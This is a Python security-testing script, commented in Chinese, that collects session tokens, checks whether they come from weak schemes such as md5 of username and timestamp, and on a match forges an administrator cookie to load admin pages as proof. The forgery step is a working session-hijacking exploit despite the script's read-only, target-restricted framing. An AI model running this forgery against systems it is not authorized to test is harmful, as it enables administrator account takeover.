"""③ 会话强度检测器 —— 找「可预测的会话 token」。

方法：
  1. 多次登录，收集 token（不同用户、不同时刻）
  2. 熵分析：长度、字符集、粗估熵位数
  3. **可预测性验证**：用常见弱生成方案对时间窗做枚举，看能否命中真实 token：
       md5(user-ts) / md5(ts-user) / md5(user+ts) / sha1(...) / 纯时间戳 ...
  4. **伪造验证**：一旦命中方案，就用同一方案伪造 admin 的 token，
     设进 Cookie 请求需管理员权限的页面 —— **能进去才算证实**（不靠猜）

只读：只登录 + 带 Cookie 访问页面，不改任何数据。
用法: python session_strength.py [base] [--user demo] [--pass demo123] [--admins admin,root]
"""
import argparse
import hashlib
import http.cookiejar
import re
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

from guard import assert_target_allowed

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:  # noqa: BLE001
    pass

ap = argparse.ArgumentParser()
ap.add_argument("base", nargs="?", default="http://127.0.0.1:8095")
ap.add_argument("--user", default="demo")
ap.add_argument("--pass", dest="pwd", default="demo123")
ap.add_argument("--admins", default="admin")
ap.add_argument("--window", type=int, default=180, help="时间窗（秒）")
a = ap.parse_args()

BASE = a.base.rstrip("/")
assert_target_allowed(BASE)
UA = "DSH-SessionStrength/0.1 (read-only)"
ADMIN_PATHS = ["/admin/users", "/admin/orders", "/admin"]


class Cli:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))

    def r(self, path, data=None, cookies=None):
        url = BASE + path
        assert_target_allowed(url)
        body = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else None
        h = {"User-Agent": UA}
        if body:
            h["Content-Type"] = "application/x-www-form-urlencoded"
        if cookies:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
        try:
            with self.op.open(urllib.request.Request(url, data=body, headers=h), timeout=12) as resp:
                return resp.status, resp.read(200_000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(100_000).decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return None, str(e)

    def token(self):
        for c in self.jar:
            if c.name.lower() in ("token", "session", "sid", "sessionid"):
                return c.name, c.value
        return None, None


def login(user, pwd):
    c = Cli()
    c.r("/login")
    t0 = time.time()
    c.r("/login", {"username": user, "password": pwd})
    name, val = c.token()
    return c, name, val, t0


print(f"=== 会话强度检测 {BASE} ===\n[1] 收集 token")
samples = []
for i in range(3):
    c, name, val, t0 = login(a.user, a.pwd)
    if val:
        samples.append({"user": a.user, "name": name, "token": val, "t": t0})
        print(f"  第{i+1}次: {name}={val[:20]}…  len={len(val)}")
    time.sleep(1.2)

if not samples:
    print("  ❌ 没拿到会话 token，无法检测"); sys.exit(1)

toks = [s["token"] for s in samples]
print("\n[2] 熵分析")
chars = set("".join(toks))
bits = len(toks[0]) * (len(chars).bit_length())
print(f"  长度={len(toks[0])}  字符集大小={len(chars)}  粗估上界≈{bits} bit")
if len(toks[0]) <= 12 or len(set(toks)) < len(toks):
    print("  ⚠️ 长度过短或出现重复 → 可疑")

print("\n[3] 可预测性验证（对时间窗枚举常见弱方案）")


def candidates(user, ts):
    """返回 {方案名: 生成值}。方案名是**模板**（不含具体用户名/时间戳），
    否则无法拿同一方案去伪造别的用户（这是我踩过的 bug）。"""
    u, t = user, str(int(ts))
    gens = {
        "md5(user-ts)": lambda: hashlib.md5(f"{u}-{t}".encode()).hexdigest(),
        "md5(ts-user)": lambda: hashlib.md5(f"{t}-{u}".encode()).hexdigest(),
        "md5(user+ts)": lambda: hashlib.md5(f"{u}{t}".encode()).hexdigest(),
        "md5(ts)": lambda: hashlib.md5(f"{t}".encode()).hexdigest(),
        "md5(user)": lambda: hashlib.md5(f"{u}".encode()).hexdigest(),
        "sha1(user-ts)": lambda: hashlib.sha1(f"{u}-{t}".encode()).hexdigest(),
        "sha256(user-ts)": lambda: hashlib.sha256(f"{u}-{t}".encode()).hexdigest(),
        "raw(user-ts)": lambda: f"{u}-{t}",
        "raw(ts)": lambda: f"{t}",
    }
    return {k: v() for k, v in gens.items()}


scheme = None
for s in samples:
    for delta in range(-a.window, a.window + 1):
        for label, val in candidates(s["user"], s["t"] + delta).items():
            if val == s["token"]:
                scheme = label
                print(f"  🎯 命中弱方案：{label}（delta={delta}s，样本 {s['token'][:16]}…）")
                break
        if scheme:
            break
    if scheme:
        break

if not scheme:
    print("  ✅ 未命中常见弱方案（token 可能用了随机数）")
    print("\n结论：未证实可预测会话。")
    sys.exit(0)

print(f"\n[4] 伪造验证：用方案 {scheme} 生成 admin token 并尝试访问后台")
hit = None
for admin in [x.strip() for x in a.admins.split(",") if x.strip()]:
    for delta in range(-a.window, a.window + 1):
        for label, val in candidates(admin, time.time() + delta).items():
            if label != scheme:
                continue
            st, body = Cli().r("/admin/users", cookies={samples[0]["name"]: val})
            if st == 200 and ("用户管理" in body or "admin" in body):
                hit = (admin, val, st)
                print(f"  🔴 伪造成功：以 {admin} 身份拿到后台页面（HTTP {st}）")
                print(f"     token={val}")
                print(f"     证据片段：{re.sub(chr(10), ' ', body)[:160]}")
                break
        if hit:
            break
    if hit:
        break

print("\n=== 结论 ===")
if hit:
    print(f"  🔴 会话可预测已证实（方案 {scheme}）→ 攻击者可冒充 {hit[0]}，属高危")
else:
    print(f"  ⚠️ 方案 {scheme} 命中样本，但未成功伪造出 admin 会话（可能用户名/时间窗不匹配，建议扩大 --window 重试）")
